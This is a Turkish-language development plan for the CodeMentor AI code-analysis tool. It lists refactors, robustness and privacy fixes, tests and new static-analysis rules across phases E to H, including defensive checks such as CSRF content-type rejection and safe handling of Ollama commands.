  - CLI (`tests/unit/test_cli_serve.py` yoksa oluştur): `uvicorn.run`'ı `monkeypatch` ile sahteye
    çevir (gerçekten sunucu BAŞLATMA) → `--host 0.0.0.0` anahtarsız → çıkış 3 ve sahte çağrılmadı;
    `--insecure` ile sahte çağrıldı; `127.0.0.1` ile normal.
  - API: `rate_limit_per_minute=2` ayarıyla 3. `POST /v1/analyze` → 429 + `Retry-After`;
    `None` ile sınırsız. Zamanı `monkeypatch` ile ilerlet (gerçek bekleme yok).

### E12 — CSRF `text/plain` regresyonu
- **Neden:** tarayıcı başka bir siteden `Content-Type: text/plain` ile basit POST atabilir (ön uçuş yok).
- **Ne yap:** `tests/api/test_trust_boundary.py`'ye test: `POST /v1/analyze` gövdesi geçerli JSON ama
  `content-type: text/plain` → 415 ya da 422 dönmeli, analiz BAŞLAMAMALI (FakeProvider çağrı sayısı 0).
  Şu an zaten reddediliyorsa kod değişmez; test yalnız davranışı sabitler. Kabul ediliyorsa
  `routes.py::analyze`'da `request.headers["content-type"]` `application/json` ile başlamıyorsa
  `ApiProblemError(415, "İçerik türü application/json olmalı.")`.

**Faz E kabul (hepsi):** E1-E12 testleri yeşil; web `typecheck/test/build/e2e`; dört denetim; §1.3
üretimi; README "Hızlı başlangıç → Web" bölümüne geçmiş/silme ve API anahtarı girişi bir-iki cümleyle
eklendi; `docs/GUNCELLEMELER.md` Faz 62'deki "yapılmadı → Faz E" maddesi `- [x]` (Faz E) yapıldı.

---

## 6. Faz F — Masaüstü

**Dal:** `faz/f-masaustu` · **Faz commit önerisi:** `fix(faz-f): masaüstü sağlamlık ve kullanılabilirlik`

**Önce oku:** `desktop/launch.py` (`main`), `desktop/app.py` (`App`; `export` ~331, `delete_history` ~407,
`clear_history` ~421, `_locations` ~454, `write_config` ~462, `reload_config` ~471, `close` ~499),
`desktop/runtime.py`, `storage/db.py::Database`, `storage/cache.py`, `storage/sessions.py`,
`desktop/views/history_view.py`, `desktop/connections.py`, `tests/desktop/test_app.py` (`_open`,
`app` fikstürü), `tests/desktop/test_user_questions_app.py` (yeni bir pencere test dosyası örneği).

### F0 — ÖNCE: `desktop/app.py`'yi böl (505 satır)
- **Ne yap:** davranış DEĞİŞMEDEN yöntemleri controller modüllerine taşı (desen:
  `desktop/questions_controller.py` — modül düzeyi fonksiyonlar `app: App` alır; `App`'te aynı adlı
  ince sarmalayıcı kalır).
  - Yeni `desktop/history_controller.py`: `export`, `open_history`, `delete_history`, `clear_history`
    gövdeleri.
  - Yeni `desktop/config_controller.py`: `_locations`, `write_config`, `reload_config` gövdeleri.
  - `App` içinde: `def export(self, fmt: str) -> None: history_controller.export(self, fmt)` gibi.
  - Yeni modüllerin EN ÜSTÜNDE tkinter/customtkinter yok (`filedialog` gerekiyorsa fonksiyon içinde
    içe aktar) → `tests/unit/test_tkinter_free_imports.py::MODULES`'a ekle.
- **Kabul:** `app.py` < 400 satır; `git diff faz/e-web -- tests/` BOŞ (F0'da testler hiç değişmedi) ve tüm testler
  geçiyor. Bu maddeyi tek başına commit'le: `refactor(faz-f): app.py controller'lara bölündü`.

### F1 — O10: bozuk/kilitli veritabanında exe açılmıyor
- **Neden:** `launch.main` içindeki `state.database()` korumasız; "file is not a database" olunca
  pencereli exe hiç açılmıyor, hata yalnız log'a gidiyor.
- **Nerede:** `desktop/launch.py::main`; yeni yardımcı `desktop/runtime.py` ya da `storage/db.py`.
- **Ne yap:**
  1. `launch.main`'de `state.database()` çağrısını `try`'a al; `sqlite3.DatabaseError`,
     `sqlalchemy.exc.DatabaseError`, `OSError` yakala.
  2. `messagebox.askyesno("CodeMentor AI", "Veritabanı açılamadı (<kısa neden>).\n\nBozuk dosya
     yedeklenip yeni, boş bir veritabanıyla başlansın mı? (Geçmiş analizler yedek dosyada kalır.)")`.
  3. Evet → dosyayı SİLME, yeniden adlandır: `codementor.db` → `codementor.db.bozuk-YYYYAAGG-SSDDss`
     (yanındaki `-wal`, `-shm` dosyaları varsa onlar da). Yeni `ApiState` ile yeniden aç.
     Yeniden adlandırma başarısızsa (dosya kilitli) `messagebox.showerror` + `SystemExit(3)`.
  4. Hayır → `SystemExit(3)`.
  5. `App`'e `report_callback_exception(self, exc_type, exc, tb)`: `log.error(..., exc_info=...)` +
     `self.toast("Beklenmeyen bir hata oldu; ayrıntı desktop.log'da.")`. Uygulama kapanmasın.
- **Test (`tests/desktop/test_launch_db.py`, pencere AÇMADAN):**
  - Geçici dizinde rastgele baytlı `codementor.db`; `CODEMENTOR_DB_PATH` (monkeypatch) oraya;
    `launch.messagebox.askyesno`'yu `lambda *a, **k: True` yap; `launch.App`'i sahte bir sınıfla
    değiştir (mainloop çağrısını yut) → yedek dosya oluştu, yeni DB açılabilir.
  - `askyesno` False → `SystemExit` kodu 3; orijinal dosya yerinde.
  - `report_callback_exception` için pencere testi (`tests/desktop/`'ta, `collect_ignore`'a ekle):
    `app.report_callback_exception(RuntimeError, RuntimeError("x"), None)` → toast metninde "beklenmeyen".

### F2 — O13: dışa aktarma hatası sessiz
- **Nerede:** `App.export` (F0'dan sonra `history_controller.export`): `Path(path).write_text(...)`.
- **Ne yap:** `OSError` yakala → `app.toast(f"Rapor kaydedilemedi: {exc.strerror or exc}")`.
- **Test (pencere testi):** `filedialog.asksaveasfilename`'i monkeypatch'le, `<tmp>/dosya/alt/r.md`
  döndürsün (`dosya` bir DOSYA) → toast'ta "kaydedilemedi"; istisna yükselmiyor.

### F3 — O14: "Geçmişi temizle" gizlilik açısından eksik
- **Neden:** silinen `report_json` (kanıt satırlarında öğrenci kodu) SQLite boş sayfalarında okunabilir
  kalıyor; son dosyalar listesi temizlenmiyor.
- **Nerede:** `storage/db.py::Database.__init__`, `storage/cache.clear_analyses`,
  `desktop/app.py::clear_history`, `desktop/runtime.py` (`prefs.recent_files`).
- **Ne yap:**
  1. `Database.__init__`'te SQLAlchemy `event.listens_for(self.engine, "connect")` ile her bağlantıda
     `PRAGMA secure_delete=ON` (bkz. F4; ikisini aynı dinleyicide yap).
  2. `clear_analyses` sonrası `VACUUM` (ayrı bağlantıda, işlem dışında:
     `with self.engine.connect() as c: c.exec_driver_sql("VACUUM")` — `begin()` içinde VACUUM çalışmaz).
     `:memory:` veritabanında VACUUM'u atla.
  3. `clear_history` son dosyalar listesini de boşaltır
     (`app.save_prefs(recent_files=[])` ve dosya menüsünü yenile).
- **Test:**
  - `tests/unit/test_storage.py`'ye: dosya tabanlı DB'ye `report_json`'unda `"BENZERSIZ_ISARET_9f3a"`
    olan bir analiz kaydet → `clear_analyses` → `db.close()` → `b"BENZERSIZ_ISARET_9f3a" not in Path(db).read_bytes()`
    (WAL kullanıyorsan `-wal` dosyasını da kontrol et ya da `PRAGMA wal_checkpoint(TRUNCATE)` yap).
  - Pencere testi: temizlikten sonra `app.prefs.recent_files == []`.

### F4 — D19: veritabanı sağlamlığı
- **Ne yap:**
  1. Bağlantı dinleyicisinde ayrıca `PRAGMA journal_mode=WAL` (yalnız dosya tabanlı DB'de; `:memory:`
     atla) ve `PRAGMA busy_timeout=5000`.
  2. Şema sürümü: `Database.__init__` sonunda `PRAGMA user_version` oku; 0 ise 1 yap. Tek bir göç noktası:
     `_migrate(connection, current: int) -> None` (şimdilik 0→1 yalnız sürümü yazar). `SCHEMA_DB_VERSION = 1`
     sabiti.
  3. Analiz sürerken tekil "Sil" düğmesi devre dışı: `history_view` satırları `app.analyze_view.busy`
     ise `state="disabled"`; `delete_history` de meşgulken toast'la reddeder ("Analiz sürerken silinemez").
  4. Eski oturum budaması: `StorageSettings.session_retention_days: int | None = Field(default=90, ge=1)`;
     `Database.from_settings` sonrası (ya da `ApiState.database()`'de bir kez) `updated_at` bu günden
     eski `SessionRow`'ları sil. `codementor.toml` + mimari §17 satırı.
- **Test:** yeni dosya DB'de `PRAGMA journal_mode` → `wal`, `user_version` → 1, `secure_delete` → 1;
  100 gün önceki oturum budanıyor, 10 gün önceki kalıyor, `None` iken hiçbiri; meşgulken
  `delete_history` silmiyor (pencere testi).

### F5 — Ctrl+S kaydet; kaydedilmemiş değişiklik uyarısı
- **Nerede:** `desktop/files.py` (dosya açma/son dosyalar), `desktop/widgets/code_editor.py`, `App`.
- **Ne yap:**
  1. Açık dosyanın yolunu ve "kirli" (değişti) bayrağını tut (`files` nesnesinde).
  2. Ctrl+S: yol varsa üzerine yaz (UTF-8, LF korunmaz — dosyanın orijinal satır sonunu koru), yoksa
     `filedialog.asksaveasfilename`. Başarıda toast "Kaydedildi: <ad>"; `OSError` → toast.
  3. Dosya açma, sürükle-bırak, geçmişten açma ve pencere kapatmada kirli ise
     `app.confirm("Kaydedilmemiş değişiklik", "Değişiklikler kaybolacak. Devam edilsin mi?")`; Hayır → iptal.
- **Test (pencere testi):** düzenle → `open_file` → `confirm` çağrıldı; Hayır → editör metni aynı;
  Ctrl+S (`app.event_generate("<Control-s>")` ya da kısayolun bağlı olduğu yöntemi doğrudan çağır) → dosya
  yazıldı; kaydettikten sonra açmada `confirm` çağrılmıyor.

### F6 — Geçmişte sayfalama ve arama
- **Nerede:** `desktop/views/history_view.py`, `storage/cache.py`.
- **Ne yap:** E1'deki `storage/cache.py::list_analyses_page`'i kullan (F dalı E'nin üstüne açıldığı için
  mevcut; §2 adım 1). E1 yapılamadıysa F6'yı da atla ve rapora yaz; fonksiyonu ikinci kez yazma.
  Üstte arama kutusu (soru kimliği / dil / sağlayıcı içinde geçen metin; büyük/küçük harf duyarsız,
  SQL `LIKE` + `escape`), altta "Daha fazla yükle".
- **Test:** 60 kayıt → ilk ekranda 50 satır, "daha fazla" sonrası 60; arama "c-medium" → yalnız eşleşenler;
  `%` ve `_` içeren arama metni joker olarak davranmıyor.

### F7 — Kapanırken "sürüyor" onayı
- **Nerede:** `App.close` (~499). `analyze_view.busy` ve zig indirmesi (`connections` tarafında
  indirme durumu; `rg -n "install_zig|download" src/codementor/desktop`).
- **Ne yap:** meşgulse `confirm("Çıkış", "Analiz (ya da indirme) sürüyor. Çıkılsın mı?")`; Hayır → kapatma.
- **Test (pencere):** `analyze_view.busy = True` (ya da `set_busy(True)`) → `close()` → `confirm` çağrıldı;
  Hayır → `app.winfo_exists()` hâlâ True.

### F8 — Keyring'deki eski OpenAI/DeepSeek anahtarları
- **Nerede:** `desktop/connections.py` (`KeyStore`; keyring testte sahte verilir).
- **Ne yap:** `KeyStore.purge_legacy() -> int`: `openai`, `deepseek` hizmet adlarındaki kayıtları siler
  (hizmet adı biçimi için `KeyStore.set/get`'e bak). Bağlantılar ekranına "Eski anahtarları temizle"
  düğmesi; sonuç toast.
- **Test:** `tests/desktop/test_connections.py` desenindeki sahte keyring'e iki eski + bir güncel kayıt →
  `purge_legacy()` 2 döner, güncel kayıt kalır.

### F9 — Kurulu zig eskiyse "güncelle" önerisi
- **Nerede:** `validation/toolchain_install.py` (`installed_zig`, `zig_root`, kurulum işaretçisi
  `INSTALL_MARKER`), `codementor.toml` `[validation.zig.sources.*]` (sürüm ve adres burada).
- **Ne yap:** işaretçide kayıtlı sürüm/kaynak, yapılandırmadakinden farklıysa `needs_update(settings) -> bool`.
  Bağlantılar'daki derleyici kartında "Güncelleme var" + "Derleyiciyi güncelle" (mevcut indirme akışı).
- **Test:** sahte kurulum dizini + işaretçi eski sürüm → True; aynı sürüm → False; kurulum yok → False.
  (Gerçek indirme YOK.)

### F10 — `ollama pull` düğmesi
- **DİKKAT (kural 8):** Ollama çalıştırma. Düğmeyi ekle, testte `subprocess`/`run_process`'i
  monkeypatch'le. Komut: `[<mutlak ollama yolu>, "pull", <config'deki model>]` liste argv, kabuk yok;
  yol `validation/runner.find_on_path("ollama", PATH)` ile bulunur (çalışma dizinine bakmaz).
  Model adı `^[A-Za-z0-9._:/-]+$` dışındaysa reddet.
- **Test:** sahte runner'a giden argv doğru; geçersiz model adı reddediliyor; ollama bulunamazsa Türkçe toast.

### F11 — SQLite çağrılarını iş parçacığına alma
- **Nerede:** `history_view.refresh` ve `App._history_rows`, `delete_history`, `clear_history`.
- **Ne yap:** `desktop/bridge.py`'deki arka plan desenini kullan: DB işi iş parçacığında, sonuç
  `app.after(0, ...)` ile arayüze. Arada liste "Yükleniyor…" gösterir.
- **Test (pencere):** `list_analyses`'i casusla sar; çağrıldığı iş parçacığı ana iş parçacığı DEĞİL
  (`threading.current_thread() is threading.main_thread()` False). Testte `app.update()` döngüsüyle
  sonucu bekle (en çok 5 sn).

### F12 — Linux/macOS'ta "Oturum aç"
- **Nerede:** `rg -n "Oturum aç|login" src/codementor/desktop` (şu an yalnız Windows konsolu açıyor).
- **Ne yap:** platforma göre komut listesi seçen saf bir fonksiyon `login_command(platform, cli_path) -> list[str] | None`:
  Windows mevcut davranış; Linux `x-terminal-emulator -e <cli> login` (yoksa `gnome-terminal --`);
  macOS `open -a Terminal <cli>`; bulunamazsa None → toast "Terminalde şu komutu çalıştırın: <cli> login".
- **Test:** üç platform için dönen liste; araç yoksa None (subprocess ÇALIŞTIRMA).

**Faz F kabul:** F0-F12 testleri; `app.py` < 400; dört denetim; §3.1 Linux taklidi; elle deneme:
`uv run python -m codementor.desktop` ile (a) Geçmiş → Tümünü temizle, (b) bir dosyayı düzenleyip
Ctrl+S, (c) düzenleyip başka dosya açma → onay. Ne gördüğünü rapora yaz. Bozuk DB'yi elle denemek
istersen ÖNCE `~/.codementor/codementor.db`'yi yedekle; mümkünse `CODEMENTOR_DB_PATH` ile geçici bir
DB kullan (kullanıcının geçmişini bozma).

---

## 7. Faz G — Sağlayıcı ve kod temizliği

**Dal:** `faz/g-saglayici` · **Faz commit önerisi:** `fix(faz-g): sağlayıcı sağlamlığı ve kod temizliği`

### G0 — ÖNCE: `pipeline/orchestrator.py` (465) ve `pipeline/passes.py` (426) bölünmesi
- **Ne yap** (davranış DEĞİŞMEDEN):
  - `orchestrator.py` → yeni `pipeline/cache_flow.py`: `_cache_key`, `_pipeline_signature`,
    `_run_validation`, kaydetme bloğu (`_run_attempt` içindeki `save_analysis` + oturum kaydı) modül
    fonksiyonları olur; `Orchestrator` yöntemleri ince sarmalayıcı kalır (testler bazılarını
    `monkeypatch.setattr(Orchestrator, "_validation", ...)`, `(Orchestrator, "_tier1", ...)` ve
    `(Orchestrator, "_remaining", ...)` ile yamalıyor — bu üç ad `Orchestrator` üzerinde yöntem olarak
    KALMALI ve kod onları `self._validation(...)` / `self._tier1(...)` / `self._remaining(...)` diye
    çağırmaya devam etmeli; aksi hâlde yama etkisiz kalır ve testler düşer).
  - `orchestrator.py` → `_timed_out`, `_remaining` (`staticmethod`'lar; testler
    `Orchestrator._remaining`'i yamalıyor → yöntem adı kalmalı, gövde `pipeline/deadline.py`'ye).
  - `passes.py` (426): testler `monkeypatch.setattr(passes, "build_socratic_messages", ...)` ve
    `monkeypatch.setattr(passes, "build_repair_messages", ...)` yapıyor. Python'da yama, adı **o modülde
    arayan** kodu etkiler. Bu yüzden `build_socratic_messages`'i kullanan `_socratic` ve
    `build_repair_messages`'i kullanan `run_pass_a` **`passes.py`'de KALMALI**; `run_llm_passes` ve
    `run_pass_b` de kalsın. Taşınacaklar:
    - yeni `pipeline/llm_session.py`: `LLMSession` sınıfı (ve yalnız onun kullandığı yardımcılar);
    - yeni `pipeline/verify_pass.py`: `run_pass_verify` ve `VERIFY_STAGES`.
    `passes.py` taşınan adları yeniden dışa aktarsın (başka modüller ve testler
    `from codementor.pipeline.passes import LLMSession, VERIFY_FAILED, ...` diye içe aktarıyor):
    `from codementor.pipeline.llm_session import LLMSession  # noqa: F401` ve
    `__all__`'a ekle. Taşımadan önce her ad için `rg -n "<ad>" src tests` ile kimin kullandığına bak.
    `call_structured` `build_repair_messages`'i kullanıyor: onu da `passes.py`'de BIRAK.
    Test dosyasını değiştirmeden 400'ün altına inemiyorsan daha fazla taşıma; rapora "passes.py N satır
    kaldı, şu yüzden" yaz.
- **Kabul:** iki dosya < 400 (ya da raporda gerekçeli istisna); `git diff <önceki dal> -- tests/` BOŞ;
  tüm testler geçiyor. Ayrı commit: `refactor(faz-g): orchestrator ve passes bölündü`.

### G1 — O5: CLI ajan çıktısı 64 KB'de kesiliyor
- **Nerede:** `validation/runner.py` (`OUTPUT_LIMIT = 64 * 1024`, `_Collector`),
  `providers/_cli_common.py` (`ProcessLimits`), `providers/cli_agent.py`, `codex_cli.py`.
- **Ne yap:** `ProcessLimits`'e `output_limit: int = OUTPUT_LIMIT`; `run_process` sınırı buradan alsın.
  `CliConfig.output_limit_bytes: int = Field(default=1_048_576, ge=65_536, le=16_777_216)`;
  CLI sağlayıcıları bunu geçirir. Derleyici (Tier 1) 64 KB'de kalır. Çıktı kesilirse
  `ProviderResult.warnings`'e "Model yanıtı çok uzundu, kesildi."
- **Test:** `tests/providers/fake_cli_script.py` desenindeki sahte CLI 200 KB yazıyor → varsayılan sınırla
  tam okunuyor; `output_limit_bytes=65536` → kesiliyor + uyarı. Tier 1 sınırı değişmedi
  (`tests/unit/test_runner.py` geçiyor).

### G2 — O6: kalıcı CLI hataları yeniden denenmez
- **Nerede:** `providers/base.py` (`retryable` sınıf özelliği; `RetryPolicy` ~satır 115-121),
  `providers/cli_agent.py`, `providers/codex_cli.py` (`_LOGIN_HINTS`, `_LIMIT_HINTS` ~59-60, hata sınıfları ~66).
- **Ne yap:** "oturum açılmamış", "komut bulunamadı", "geçersiz/bilinmeyen model" durumlarında fırlatılan
  hata `retryable = False` olan bir sınıf olsun (mevcut `CliTimeoutError` deseni).
- **Test:** sahte CLI "not logged in" basıyor → sağlayıcı bir kez çağrılır (`RetryPolicy(max_retries=2)` ile
  bile); ağ benzeri geçici hata hâlâ yeniden deneniyor.

### G3 — D1-D12 küçük düzeltmeler (her biri ayrı test; birkaçını birlikte commit'leyebilirsin)
| No | Nerede | Ne yap | Test |
|---|---|---|---|
| D1 | `prompts/v1/repair.user.j2`, `prompts/templates.py::_DELIMITER` | `<validation_errors>`/`</validation_errors>` da `guard` kapsamında; karmaşıklık nedenli onarımda "şemaya uymadı" yerine "karmaşıklık statik ipucuyla çelişiyor" metni | `</validation_errors>` içeren hata metni nötrleniyor; karmaşıklık onarım prompt'unda doğru metin |
| D2 | `verify/schema_check.py::extract_json` (~43) | tırnak durumu yalnız ilk `{`'dan sonra izlensin | `extract_json('Model "notu: {"a": 1}')` → `{"a": 1}` |
| D3 | `providers/codex_cli.py::_events` (~69; `except ValueError`) | `except (ValueError, RecursionError)` | 10 000 iç içe `[` satırı → çökmüyor, satır atlanıyor |
| D4 | `codex_cli.py` `_LOGIN_HINTS`/`_LIMIT_HINTS` | çıplak `"401"`, `"429"` → `re.compile(r"\b401\b")` gibi kelime sınırlı | "line 4291" eşleşmiyor; "HTTP 429" eşleşiyor |
| D5 | `verify/proof.py::apply_verdicts` (~94-133) | yeniden numaralandırmadan sonra `FindingCheck.finding_id` YENİ kimlik | düşürmeden sonra `checks[i].finding_id == findings[i].id` |
| D6 | `pipeline/passes.py::LLMSession` | geçiş başına (`stage_tokens` gibi) sağlayıcı/model; `orchestrator._report`'taki maliyet her aşamanın kendi sağlayıcı fiyatıyla toplanır | fallback'e düşen B geçişinin maliyeti doğru fiyatla (FakeProvider adlarıyla `data/pricing.yaml`'a test fiyatı ekleme; `load_pricing`'i monkeypatch'le) |
| D7 | `passes.run_pass_b` | sızıntı sonrası yeniden üretimde prompt sonuna "Önceki sorular çözümü fazla ele veriyordu; daha soyut sor." notu (içerik tekrar etmeden) | ikinci çağrının kullanıcı mesajında not var, ilk sorunun metni yok |
| D8 | `prompts/builder.py`, `orchestrator.py` | bozuk few-shot YAML / Jinja `TemplateError` / `FileNotFoundError` → rapor `degraded`, istisna yükselmez | bozuk few-shot dosyasıyla (geçici `prompts.dir`) analiz `degraded=True` |
| D9 | `providers/anthropic.py`, `prompts/budget.py`, `orchestrator.py` | tekrar eden `DEFAULT_MAX_TOKENS`, gereksiz `isinstance`, kullanılmayan `built` dönüşleri; `TEST_PROVIDERS={"fake"}` üretim kodundan çıkar (FakeProvider'a bağlam bilgisini kendisi versin) | var olan testler geçiyor; `rg -n TEST_PROVIDERS src` boş |
| D10 | `models/schemas.py` (`SCHEMA_MODELS`) | `LLMMarkupAnalysisOutput` ekle; §1.3 | `schemas/llm_markup_analysis.schema.json` oluştu; `test_schema_export` geçiyor |
| D11 | `prompts/templates.py::prompt_version`, `orchestrator._rules_version`, CLI soru bankası | dizin taraması/okuma mtime anahtarlı önbelleğe | aynı ayarla iki analizde `rglob` 1 kez (casus); dosya değişince yeniden okunuyor |
| D12 | `providers/cli_agent.py::_json_document` (~108) | doğrusal tarama | 160 KB girdi < 0,25 sn |

### G4 — D18: Tier 0 durdurma tanısı yapısal bayrak
- **Nerede:** `validation/tier0_isolation.py::stopped` (~99; metinle tanıyor:
  `startswith("Kodun sözdizimi")`), `models/validation.py::Tier0Result`.
- **Ne yap:** `Tier0Result.stopped: bool = False`; `_stopped(...)` bayrağı True yapar; `stopped()` bayrağa
  bakar. §1.3 üretimi.
- **Test:** mesaj metni değiştirilmiş bir `_stopped` sonucu yine "durduruldu" sayılıyor; normal sözdizimi
  hatası sayılmıyor.

### G5 — D20 kalanları
1. `src/codementor/buildinfo.py`: modül düzeyindeki maskesiz `logging` kullanımı → `codementor.log.get_logger`.
2. `--help` metinlerindeki İngilizce ("Show this message and exit.") Typer'ın kendi metni. Typer/click
   ayarıyla Türkçeleştirilebiliyorsa yap (`context_settings`), değilse rapora "değiştirilemedi" yaz;
   kendi `--help` seçeneğini yazma.
3. `cli/eval.py` `eval run --language`: serbest metin → `Language` enum (Typer seçenek tipi).
   Geçersiz değer çıkış 2.
4. `build_exe.py`: masaüstü exe FastAPI/uvicorn kullanmıyor → `EXCLUDES`'a `"fastapi", "uvicorn",
   "starlette"` ekle. Sonra `uv run python build_exe.py --onedir` ve
   `.\dist\CodeMentor\CodeMentor.exe --self-check sc.json` → çıkış 0 olmalı, `sc.json` içinde `"ok": true`.
   Geçmezse GERİ AL, rapora yaz. (Exe derlemesi ~3-5 dk sürer.)
5. `pyproject.toml` `[desktop]` extra: **YAPMA** — CI, release ve exe derlemesini etkiler; rapora
   "kullanıcı kararı" olarak yaz.

### G6 — Denetimden ertelenenler (`PROGRESS.md` "Denetim — Faz A1-D" notu, "Ertelenen")
| Madde | Nerede | Ne yap | Test |
|---|---|---|---|
| Dizi tablosu | `desktop/config_writer.py::_table` | `providers` ya da `providers.<ad>` bir dizi tablosu (`[[providers.x]]`, `AoT`) ya da tablo olmayan bir değerse (`providers = "x"`) EZME; `ValueError("codementor.toml'da [providers] beklenmeyen biçimde; elle düzeltin.")` | dizi tablolu dosya → hata, dosya baytları değişmedi |
| CRLF | `config_writer.write_provider_prefs` | okurken `newline=""` ile oku, orijinal satır sonunu (CRLF/LF) yazarken koru | CRLF giriş → CRLF çıkış; LF giriş → LF |
| `from_question` kayıplı | `models/questions.py::UserQuestionDraft.from_question` | kullanıcı `genel` etiketini/varsayılan kısıtı açıkça yazdıysa silinmesin. Yol: `to_question`'da varsayılan doldurulduysa `Question`'a işaret koyma (şema değişikliği) YERİNE: etiket listesi yalnız `["genel"]` ise boşalt, birden fazla etiket varsa dokunma; kısıt listesi yalnız `[DEFAULT_USER_CONSTRAINT]` ise boşalt | `concept_tags=['genel','dizi']` → gidiş-dönüşte iki etiket kalıyor |
| Ağ hatası metni | `cli/errors.py::describe` | `ConnectionError`/`TimeoutError` (OSError alt sınıfları) için "ağ hatası: …" | mesaj testi |
| Katman | `report/usage.py` → `storage.cache.UsageTotals` | `UsageTotals`'ı `dataclass` olarak `src/codementor/models/` altına (ör. `models/usage.py`) taşı; `storage.cache` ve `report.usage` oradan içe aktarsın | `rg -n "from codementor.storage" src/codementor/report` boş |
| `primary` adı | `orchestrator.py` (`getattr(provider, "chain", [provider])[0].name`) | `LLMProvider` protokolüne `primary_name` özelliği (FallbackProvider: ilk zincir; diğerleri: `name`) | mevcut önbellek/fallback testleri geçiyor |

### G7 — `ProviderResult.schema_enforced` ve token kalibrasyon günlüğü
- `models/provider.py::ProviderResult`'a `schema_enforced: bool = False` (sağlayıcı katı JSON şeması
  uyguladı mı: anthropic yapılandırılmış çıktı, openai_compat strict = True; CLI'lar False).
  Raporda gösterilmez. Token tahmini (`prompts/budget.estimate_messages`) gerçek `usage.input_tokens`
  geldiğinde oran `log.debug("token_estimate_ratio", ...)` ile yazılır; davranış değişmez.
- **Test:** FakeProvider ile alanın varsayılanı; anthropic sağlayıcı testinde (respx ile, ağsız) True.

**Faz G kabul:** G0-G7 testleri; iki büyük dosya < 400; dört denetim; §3.1 Linux taklidi; G5-4 exe
duman testi çıktısı rapora.

---

## 8. Faz H — Statik kurallar

**Dal:** `faz/h-kurallar` · **Faz commit önerisi:** `feat(faz-h): yeni statik kurallar ve doğruluk düzeltmeleri`

### 8.0 Bir kural nasıl eklenir (önce bir mevcut kuralı uçtan uca incele)
1. Örnek: `CS-ALLOC-001` (`src/codementor/rules/csharp.py::StringConcatInLoop`, ~satır 79). Bir kural:
   ```python
   @register_rule
   class Xxx(Rule):
       """KİMLİK: kısa açıklama."""

       id = "C-IO-002"
       title = "Türkçe başlık"
       description = "Soru biçiminde açıklama: … olursa ne olur?"
       languages = frozenset({Language.C})
       category = AuditCategory.MEMORY_SAFETY  # models/enums.py::AuditCategory
       default_severity = Severity.HIGH

       def check(self, ctx: RuleContext) -> list[Finding]: ...
   ```
   `ctx` yardımcıları için `src/codementor/rules/base.py` ve `engine.py`'yi oku (`nodes_in`, `in_loop`,
   `types`, `facts`…). Öneri türü (düşük önem) için mevcut bir öneri kuralına bak
   (`rg -n "kind_label|SUGGESTION" src/codementor/rules`).
2. **Fixture düzeni** (`tests/rules/_fixtures.py` belgesi):
   `tests/rules/fixtures/{KURAL_ID}/positive/*.{c,cpp,cs,py,html,css}` ve `.../negative/*`.
   Pozitif dosyada beklenen satırlar yorumla: `// EXPECT: 7` ya da `// EXPECT: 7, 12`
   (CSS'te `/* EXPECT: 3 */`). Tür: `// EXPECT_KIND: suggestion`. Motor: `// ENGINE: unity`.
   `tests/rules/test_all_rules.py` her kural klasörünü OTOMATİK bulur; ayrı test yazmana gerek yok
   (ama her kuralda en az 2 pozitif + 2 negatif).
3. Süre: her yeni kural için 40 KB kötü niyetli girdi testi; mevcut desen
   `rg -n "40 \* 1024|40_000|ADVERSARIAL" tests/rules tests/unit` ile bul.
4. Katalog: `uv run codementor rules doc` → `docs/rules-catalog.md` yeniden üretilir (elle düzenleme).
5. README sayısı: kural sayısı (34) `README.md`'de 3 yerde (satır ~36 "Bir bakışta", ~140 katman
   tablosu, ~346 CLI örneği) ve `README.en.md`'de 2 yerde (~38, ~51). `rg -n "34" README.md README.en.md`
   ile bul, hepsini yeni sayıyla güncelle.

**Mevcut kural kimlikleri** (yenilerle çakışma; sıradaki numarayı kullan):
C-BUF-001, C-IO-001, C-MEM-001..003, C-PERF-001, C-UB-001, CPP-OWN-001, CPP-PERF-001, CPP-SP-001,
CS-ALLOC-001..002, CS-PERF-001, CSS-MAINT-001..002, CSS-STD-001, HTML-ACC-001..003, HTML-STD-001..003,
PY-DESIGN-001..002, PY-EDGE-001, PY-PERF-001, PY-RES-001, UE-GC-001, UE-MEM-001, UE-PERF-001,
UNITY-EVT-001, UNITY-GC-001, UNITY-PERF-001..002.

### H1 — Yeni kurallar (7 kural)
**Not:** C#'ta "döngüde `string +=`" kuralı ZATEN VAR (`CS-ALLOC-001`) — yapma.
| Önerilen kimlik | Dil | Kural | Pozitif | Negatif |
|---|---|---|---|---|
| CSS-ACC-001 | CSS | `outline: none`/`outline: 0` + aynı seçicide ya da `:focus-visible`'da başka odak göstergesi yok | `button:focus { outline: none; }` | aynı blokta `box-shadow`/`border` var; ayrı `:focus-visible` kuralı var |
| CSS-LAYOUT-001 | CSS | metin içeren kutuda sabit `height: Npx` (taşma) — öneri, düşük | `.kart { height: 200px; }` | `min-height: 200px`; `img { height: 200px }` |
| CSS-LAYOUT-002 | CSS | `position:absolute` + `left:50%` + negatif `margin-left` ile ortalama — öneri | `left:50%; margin-left:-100px;` | `transform: translateX(-50%)` |
| CPP-PERF-002 | C++ | döngüde `std::string s = s + x;` (karesel) | `for(...) s = s + x;` | `s += x;` (amortize); döngü dışında |
| CPP-PERF-003 | C++ | döngüde `std::endl` (her seferinde flush) — öneri | `for(...) std::cout << x << std::endl;` | `'\n'`; döngü dışında tek `endl` |
| CPP-PERF-004 | C++ | bilinen sayıda dönen döngüde `reserve` olmadan `push_back` — öneri, düşük | `for(int i=0;i<n;i++) v.push_back(i);` | önce `v.reserve(n);` |
| C-BUF-002 | C | genişlik sınırı olmayan `scanf("%s", …)` / `fscanf(f, "%s", …)` (tampon taşması) | `scanf("%s", buf);` | `scanf("%99s", buf);`, `fgets(buf, …)` |
- `C-BUF-002` için: format dizgisi metin sabiti değilse (değişken) bulgu VERME (emin olunmayan durumda
  sus; projenin kuralı).

### H2 — Bilinen kaçırmalar ve yanlış pozitifler (her biri için yeni fixture dosyası)
| Kural | Durum | Beklenen |
|---|---|---|
| CPP-OWN-001 | `new` sonrası erken `return` ya da `throw` yolunda `delete` atlanıyor | hata (öneri değil) |
| C-MEM-001 | aynı dosyada tanımlı, işaretçiyi `free` eden kullanıcı fonksiyonuna geçirilen işaretçi | bulgu YOK |
| UNITY-GC-001 | kullanıcının tanımladığı `struct` için `new` | bulgu YOK (değer tipi) |
| UE-GC-001 | `TArray<AActor*>` / `TMap<FName, UObject*>` UPROPERTY'siz alanlar | bulgu VAR; UCLASS olmayan sınıfta öneri metni doğru |
| CS-PERF-001 | `IList<T>`, `IReadOnlyList<T>`, `ICollection<T>` tipli değişkenlerde döngüde `Contains` | bulgu VAR |
